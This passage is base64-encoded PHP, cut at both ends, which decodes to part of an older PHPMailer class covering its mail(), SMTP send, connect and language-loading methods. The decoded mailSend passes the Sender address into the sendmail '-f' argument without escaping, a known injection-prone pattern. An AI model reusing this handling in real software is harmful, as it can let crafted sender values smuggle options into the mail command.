FtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9ib29rLm1haWwucGhwCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJHRvQXJyID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgewogICAgICAgICAgICAkdG9BcnJbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOwogICAgICAgIH0KICAgICAgICAkdG8gPSBpbXBsb2RlKCcsICcsICR0b0Fycik7CgogICAgICAgIGlmIChlbXB0eSgkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAkcGFyYW1zID0gJyAnOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+U2VuZGVyICE9ICcnIGFuZCAhaW5pX2dldCgnc2FmZV9tb2RlJykpIHsKICAgICAgICAgICAgJG9sZF9mcm9tID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgPSBmYWxzZTsKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvICYmIGNvdW50KCR0b0FycikgPiAxKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCR0b0FyciBhcyAkdG9BZGRyKSB7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG9BZGRyLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgYXJyYXkoJHRvQWRkciksICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG8sICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7CiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsICR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzc2V0KCRvbGRfZnJvbSkpIHsKICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICRvbGRfZnJvbSk7CiAgICAgICAgfQogICAgICAgIGlmICghJHJlc3VsdCkgewogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdpbnN0YW50aWF0ZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgYW4gaW5zdGFuY2UgdG8gdXNlIGZvciBTTVRQIG9wZXJhdGlvbnMuCiAgICAgKiBPdmVycmlkZSB0aGlzIGZ1bmN0aW9uIHRvIGxvYWQgeW91ciBvd24gU01UUCBpbXBsZW1lbnRhdGlvbgogICAgICogQHJldHVybiBTTVRQCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTTVRQSW5zdGFuY2UoKQogICAgewogICAgICAgIGlmICghaXNfb2JqZWN0KCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9IG5ldyBTTVRQOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHA7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1haWwgdmlhIFNNVFAuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZXJlIGlzIGEgYmFkIE1BSUwgRlJPTSwgUkNQVCwgb3IgREFUQSBpbnB1dC4KICAgICAqIFVzZXMgdGhlIFBIUE1haWxlclNNVFAgY2xhc3MgYnkgZGVmYXVsdC4KICAgICAqIEBzZWUgUEhQTWFpbGVyOjpnZXRTTVRQSW5zdGFuY2UoKSB0byB1c2UgYSBkaWZmZXJlbnQgY2xhc3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBUaGUgbWVzc2FnZSBib2R5CiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHVzZXMgU01UUAogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc210cFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJGJhZF9yY3B0ID0gYXJyYXkoKTsKICAgICAgICBpZiAoISR0aGlzLT5zbXRwQ29ubmVjdCgkdGhpcy0+U01UUE9wdGlvbnMpKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3NtdHBfY29ubmVjdF9mYWlsZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIGlmICgnJyA9PSAkdGhpcy0+U2VuZGVyKSB7CiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+bWFpbCgkc210cF9mcm9tKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+RXJyb3JJbmZvLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CgogICAgICAgIC8vIEF0dGVtcHQgdG8gc2VuZCB0byBhbGwgcmVjaXBpZW50cwogICAgICAgIGZvcmVhY2ggKGFycmF5KCR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjKSBhcyAkdG9ncm91cCkgewogICAgICAgICAgICBmb3JlYWNoICgkdG9ncm91cCBhcyAkdG8pIHsKICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPnJlY2lwaWVudCgkdG9bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9yID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7CiAgICAgICAgICAgICAgICAgICAgJGJhZF9yY3B0W10gPSBhcnJheSgndG8nID0+ICR0b1swXSwgJ2Vycm9yJyA9PiAkZXJyb3JbJ2RldGFpbCddKTsKICAgICAgICAgICAgICAgICAgICAkaXNTZW50ID0gZmFsc2U7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJGlzU2VudCwgYXJyYXkoJHRvWzBdKSwgYXJyYXkoKSwgYXJyYXkoKSwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIE9ubHkgc2VuZCB0aGUgREFUQSBjb21tYW5kIGlmIHdlIGhhdmUgdmlhYmxlIHJlY2lwaWVudHMKICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT5hbGxfcmVjaXBpZW50cykgPiBjb3VudCgkYmFkX3JjcHQpKSBhbmQgISR0aGlzLT5zbXRwLT5kYXRhKCRoZWFkZXIgLiAkYm9keSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZGF0YV9ub3RfYWNjZXB0ZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+U01UUEtlZXBBbGl2ZSkgewogICAgICAgICAgICAkdGhpcy0+c210cC0+cmVzZXQoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICB9CiAgICAgICAgLy9DcmVhdGUgZXJyb3IgbWVzc2FnZSBmb3IgYW55IGJhZCBhZGRyZXNzZXMKICAgICAgICBpZiAoY291bnQoJGJhZF9yY3B0KSA+IDApIHsKICAgICAgICAgICAgJGVycnN0ciA9ICcnOwogICAgICAgICAgICBmb3JlYWNoICgkYmFkX3JjcHQgYXMgJGJhZCkgewogICAgICAgICAgICAgICAgJGVycnN0ciAuPSAkYmFkWyd0byddIC4gJzogJyAuICRiYWRbJ2Vycm9yJ107CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigKICAgICAgICAgICAgICAgICR0aGlzLT5sYW5nKCdyZWNpcGllbnRzX2ZhaWxlZCcpIC4gJGVycnN0ciwKICAgICAgICAgICAgICAgIHNlbGY6OlNUT1BfQ09OVElOVUUKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBJbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gYW4gU01UUCBzZXJ2ZXIuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBvcGVyYXRpb24gZmFpbGVkLgogICAgICogQHBhcmFtIGFycmF5ICRvcHRpb25zIEFuIGFycmF5IG9mIG9wdGlvbnMgY29tcGF0aWJsZSB3aXRoIHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgpCiAgICAgKiBAdXNlcyBTTVRQCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBhcnJheSgpKQogICAgewogICAgICAgIGlmIChpc19udWxsKCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsKICAgICAgICB9CgogICAgICAgIC8vIEFscmVhZHkgY29ubmVjdGVkPwogICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+c210cC0+c2V0VGltZW91dCgkdGhpcy0+VGltZW91dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnTGV2ZWwoJHRoaXMtPlNNVFBEZWJ1Zyk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldERlYnVnT3V0cHV0KCR0aGlzLT5EZWJ1Z291dHB1dCk7CiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFZlcnAoJHRoaXMtPmRvX3ZlcnApOwogICAgICAgICRob3N0cyA9IGV4cGxvZGUoJzsnLCAkdGhpcy0+SG9zdCk7CiAgICAgICAgJGxhc3RleGNlcHRpb24gPSBudWxsOwoKICAgICAgICBmb3JlYWNoICgkaG9zdHMgYXMgJGhvc3RlbnRyeSkgewogICAgICAgICAgICAkaG9zdGluZm8gPSBhcnJheSgpOwogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9eKChzc2x8dGxzKTpcL1wvKSooW2EtekEtWjAtOVwuLV0qKTo/KFswLTldKikkLycsIHRyaW0oJGhvc3RlbnRyeSksICRob3N0aW5mbykpIHsKICAgICAgICAgICAgICAgIC8vIE5vdCBhIHZhbGlkIGhvc3QgZW50cnkKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vICRob3N0aW5mb1syXTogb3B0aW9uYWwgc3NsIG9yIHRscyBwcmVmaXgKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzNdOiB0aGUgaG9zdG5hbWUKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzRdOiBvcHRpb25hbCBwb3J0IG51bWJlcgogICAgICAgICAgICAvLyBUaGUgaG9zdCBzdHJpbmcgcHJlZml4IGNhbiB0ZW1wb3JhcmlseSBvdmVycmlkZSB0aGUgY3VycmVudCBzZXR0aW5nIGZvciBTTVRQU2VjdXJlCiAgICAgICAgICAgIC8vIElmIGl0J3Mgbm90IHNwZWNpZmllZCwgdGhlIGRlZmF1bHQgdmFsdWUgaXMgdXNlZAogICAgICAgICAgICAkcHJlZml4ID0gJyc7CiAgICAgICAgICAgICRzZWN1cmUgPSAkdGhpcy0+U01UUFNlY3VyZTsKICAgICAgICAgICAgJHRscyA9ICgkdGhpcy0+U01UUFNlY3VyZSA9PSAndGxzJyk7CiAgICAgICAgICAgIGlmICgnc3NsJyA9PSAkaG9zdGluZm9bMl0gb3IgKCcnID09ICRob3N0aW5mb1syXSBhbmQgJ3NzbCcgPT0gJHRoaXMtPlNNVFBTZWN1cmUpKSB7CiAgICAgICAgICAgICAgICAkcHJlZml4ID0gJ3NzbDovLyc7CiAgICAgICAgICAgICAgICAkdGxzID0gZmFsc2U7IC8vIENhbid0IGhhdmUgU1NMIGFuZCBUTFMgYXQgdGhlIHNhbWUgdGltZQogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICdzc2wnOwogICAgICAgICAgICB9IGVsc2VpZiAoJGhvc3RpbmZvWzJdID09ICd0bHMnKSB7CiAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsKICAgICAgICAgICAgICAgIC8vIHRscyBkb2Vzbid0IHVzZSBhIHByZWZpeAogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICd0bHMnOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vRG8gd2UgbmVlZCB0aGUgT3BlblNTTCBleHRlbnNpb24/CiAgICAgICAgICAgICRzc2xleHQgPSBkZWZpbmVkKCdPUEVOU1NMX0FMR09fU0hBMScpOwogICAgICAgICAgICBpZiAoJ3RscycgPT09ICRzZWN1cmUgb3IgJ3NzbCcgPT09ICRzZWN1cmUpIHsKICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGFuIE9wZW5TU0wgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkCiAgICAgICAgICAgICAgICBpZiAoISRzc2xleHQpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpLidvcGVuc3NsJywgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGhvc3QgPSAkaG9zdGluZm9bM107CiAgICAgICAgICAgICRwb3J0ID0gJHRoaXMtPlBvcnQ7CiAgICAgICAgICAgICR0cG9ydCA9IChpbnRlZ2VyKSRob3N0aW5mb1s0XTsKICAgICAgICAgICAgaWYgKCR0cG9ydCA+IDAgYW5kICR0cG9ydCA8IDY1NTM2KSB7CiAgICAgICAgICAgICAgICAkcG9ydCA9ICR0cG9ydDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3QoJHByZWZpeCAuICRob3N0LCAkcG9ydCwgJHRoaXMtPlRpbWVvdXQsICRvcHRpb25zKSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkhlbG8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPkhlbG87CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPnNlcnZlckhvc3RuYW1lKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOwogICAgICAgICAgICAgICAgICAgIC8vQXV0b21hdGljYWxseSBlbmFibGUgVExTIGVuY3J5cHRpb24gaWY6CiAgICAgICAgICAgICAgICAgICAgLy8gKiBpdCdzIG5vdCBkaXNhYmxlZAogICAgICAgICAgICAgICAgICAgIC8vICogd2UgaGF2ZSBvcGVuc3NsIGV4dGVuc2lvbgogICAgICAgICAgICAgICAgICAgIC8vICogd2UgYXJlIG5vdCBhbHJlYWR5IHVzaW5nIFNTTAogICAgICAgICAgICAgICAgICAgIC8vICogdGhlIHNlcnZlciBvZmZlcnMgU1RBUlRUTFMKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRvVExTIGFuZCAkc3NsZXh0IGFuZCAkc2VjdXJlICE9ICdzc2wnIGFuZCAkdGhpcy0+c210cC0+Z2V0U2VydmVyRXh0KCdTVEFSVFRMUycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0bHMgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRscykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5zdGFydFRMUygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdjb25uZWN0X2hvc3QnKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gV2UgbXVzdCByZXNlbmQgSEVMTyBhZnRlciB0bHMgbmVnb3RpYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U01UUEF1dGgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+YXV0aGVudGljYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlBhc3N3b3JkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkF1dGhUeXBlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlYWxtLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPldvcmtzdGF0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdhdXRoZW50aWNhdGUnKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgICAgICRsYXN0ZXhjZXB0aW9uID0gJGV4YzsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICAgICAgLy8gV2UgbXVzdCBoYXZlIGNvbm5lY3RlZCwgYnV0IHRoZW4gZmFpbGVkIFRMUyBvciBBdXRoLCBzbyBjbG9zZSBjb25uZWN0aW9uIG5pY2VseQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy8gSWYgd2UgZ2V0IGhlcmUsIGFsbCBjb25uZWN0aW9uIGF0dGVtcHRzIGhhdmUgZmFpbGVkLCBzbyBjbG9zZSBjb25uZWN0aW9uIGhhcmQKICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICAvLyBBcyB3ZSd2ZSBjYXVnaHQgYWxsIGV4Y2VwdGlvbnMsIGp1c3QgcmVwb3J0IHdoYXRldmVyIHRoZSBsYXN0IG9uZSB3YXMKICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMgYW5kICFpc19udWxsKCRsYXN0ZXhjZXB0aW9uKSkgewogICAgICAgICAgICB0aHJvdyAkbGFzdGV4Y2VwdGlvbjsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQ2xvc2UgdGhlIGFjdGl2ZSBTTVRQIHNlc3Npb24gaWYgb25lIGV4aXN0cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENsb3NlKCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPnNtdHAgIT09IG51bGwpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBsYW5ndWFnZSBmb3IgZXJyb3IgbWVzc2FnZXMuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIGl0IGNhbm5vdCBsb2FkIHRoZSBsYW5ndWFnZSBmaWxlLgogICAgICogVGhlIGRlZmF1bHQgbGFuZ3VhZ2UgaXMgRW5nbGlzaC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdjb2RlIElTTyA2MzktMSAyLWNoYXJhY3RlciBsYW5ndWFnZSBjb2RlIChlLmcuIEZyZW5jaCBpcyAiZnIiKQogICAgICogQHBhcmFtIHN0cmluZyAkbGFuZ19wYXRoIFBhdGggdG8gdGhlIGxhbmd1YWdlIGZpbGUgZGlyZWN0b3J5LCB3aXRoIHRyYWlsaW5nIHNlcGFyYXRvciAoc2xhc2gpCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRMYW5ndWFnZSgkbGFuZ2NvZGUgPSAnZW4nLCAkbGFuZ19wYXRoID0gJycpCiAgICB7CiAgICAgICAgLy8gRGVmaW5lIGZ1bGwgc2V0IG9mIHRyYW5zbGF0YWJsZSBzdHJpbmdzIGluIEVuZ2xpc2gKICAgICAgICAkUEhQTUFJTEVSX0xBTkcgPSBhcnJheSgKICAgICAgICAgICAgJ2F1dGhlbnRpY2F0ZScgPT4gJ1NNVFAgRXJyb3I6IENvdWxkIG5vdCBhdXRoZW50aWNhdGUuJywKICAgICAgICAgICAgJ2Nvbm5lY3RfaG9zdCcgPT4gJ1NNVFAgRXJyb3I6IENvdWxkIG5vdCBjb25uZWN0IHRvIFNNVFAgaG9zdC4nLAogICAgICAgICAgICAnZGF0YV9ub3RfYWNjZXB0ZWQnID0+ICdTTVRQIEVycm9yOiBkYXRhIG5vdCBhY2NlcHRlZC4nLAogICAgICAgICAgICAnZW1wdHlfbWVzc2FnZScgPT4gJ01lc3NhZ2UgYm9keSBlbXB0eScsCiAgICAgICAgICAgICdlbmNvZGluZycgPT4gJ1Vua25vd24gZW5jb2Rpbmc6ICcsCiAgICAgICAgICAgICdleGVjdXRlJyA9PiAnQ291bGQgbm90IGV4ZWN1dGU6ICcsCiAgICAgICAgICAgICdmaWxlX2FjY2VzcycgPT4gJ0NvdWxkIG5vdCBhY2Nlc3MgZmlsZTogJywKICAgICAgICAgICAgJ2ZpbGVfb3BlbicgPT4gJ0ZpbGUgRXJyb3I6IENvdWxkIG5vdCBvcGVuIGZpbGU6ICcsCiAgICAgICAgICAgICdmcm9tX2ZhaWxlZCcgPT4gJ1RoZSBmb2xsb3dpbmcgRnJvbSBhZGRyZXNzIGZhaWxlZDogJywKICAgICAgICAgICAgJ2luc3RhbnRpYXRlJyA9PiAnQ291bGQgbm90IGluc3RhbnRpYXRlIG1haWwgZnVuY3Rpb24uJywKICAgICAgICAgICAgJ2ludmFsaWRfYWRkcmVzcycgPT4gJ0ludmFsaWQgYWRkcmVzczogJywKICAgICAgICAgICAgJ21haWxlcl9ub3Rfc3VwcG9ydGVkJyA9PiAnIG1haWxlciBpcyBub3Qgc3VwcG9ydGVkLicsCiAgICAgICAgICAgICdwcm92aWRlX2FkZHJlc3MnID0+ICdZb3UgbXVzdCBwcm92aWRlIGF0IGxlYXN0IG9uZSByZWNpcGllbnQgZW1haWwgYWRkcmVzcy4nLAogICAgICAgICAgICAncmVjaXBpZW50c19mYWlsZWQnID0+ICdTTVRQIEVycm9yOiBUaGUgZm9sbG93aW5nIHJlY2lwaWVudHMgZmFpbGVkOiAnLAogICAgICAgICAgICAnc2lnbmluZycgPT4gJ1NpZ25pbmcgRXJyb3I6ICcsCiAgICAgICAgICAgICdzbXRwX2Nvbm5lY3RfZmFpbGVkJyA9PiAnU01UUCBjb25uZWN0KCkgZmFpbGVkLicsCiAgICAgICAgICAgICdzbXRwX2Vycm9yJyA9PiAnU01UUCBzZXJ2ZXIgZXJyb3I6ICcsCiAgICAgICAgICAgICd2YXJpYWJsZV9zZXQnID0+ICdDYW5ub3Qgc2V0IG9yIHJlc2V0IHZhcmlhYmxlOiAnLAogICAgICAgICAgICAnZXh0ZW5zaW9uX21pc3NpbmcnID0+ICdFeHRlbnNpb24gbWlzc2luZzogJwogICAgICAgICk7CiAgICAgICAgaWYgKGVtcHR5KCRsYW5nX3BhdGgpKSB7CiAgICAgICAgICAgIC8vIENhbGN1bGF0ZSBhbiBhYnNvbHV0ZSBwYXRoIHNvIGl0IGNhbiB3b3JrIGlmIENXRCBpcyBub3QgaGVyZQogICAgICAgICAgICAkbGFuZ19wYXRoID0gZGlybmFtZShfX0ZJTEVfXykuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnbGFuZ3VhZ2UnLiBESVJFQ1RPUllfU0VQQVJBVE9SOwogICAgICAgIH0KICAgICAgICAkZm91bmRsYW5nID0gdHJ1ZTsKICAgICAgICAkbGFuZ19maWxlID0gJGxhbmdfcGF0aCAuICdwaHBtYWlsZXIubGFuZy0nIC4gJGxhbmdjb2RlIC4gJy5waHAnOwogICAgICAgIC8vIFRoZXJlIGlzIG5vIEVuZ2xpc2ggdHJhbnNsYXRpb24gZmlsZQogICAgICAgIGlmICgkbGFuZ2NvZGUgIT0gJ2VuJykgewogICAgICAgICAgICAvLyBNYWtlIHN1cmUgbGFuZ3VhZ2UgZmlsZSBwYXRoIGlzIHJlYWRhYmxlCiAgICAgICAgICAgIGlmICghaXNfcmVhZGFibGUoJGxhbmdfZmlsZSkpIHsKICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE92ZXJ3cml0ZSBsYW5ndWFnZS1zcGVjaWZpYyBzdHJpbmdzLgogICAgICAgICAgICAgICAgLy8gVGhpcyB3YXkgd2UnbGwgbmV2ZXIgaGF2ZSBtaXNzaW5nIHRyYW5zbGF0aW9uIGtleXMuCiAgICAgICAgICAgICAgICAkZm91bmRsYW5nID0gaW5jbHVkZSAkbGFuZ19maWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5sYW5ndWFnZSA9ICRQSFBNQUlMRVJfTEFORzsKICAgICAgICByZXR1cm4gKGJvb2xlYW4pJGZvdW5kbGFuZzsgLy8gUmV0dXJucyBmYWxzZSBpZiBsYW5ndWFnZSBub3QgZm91bmQKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgK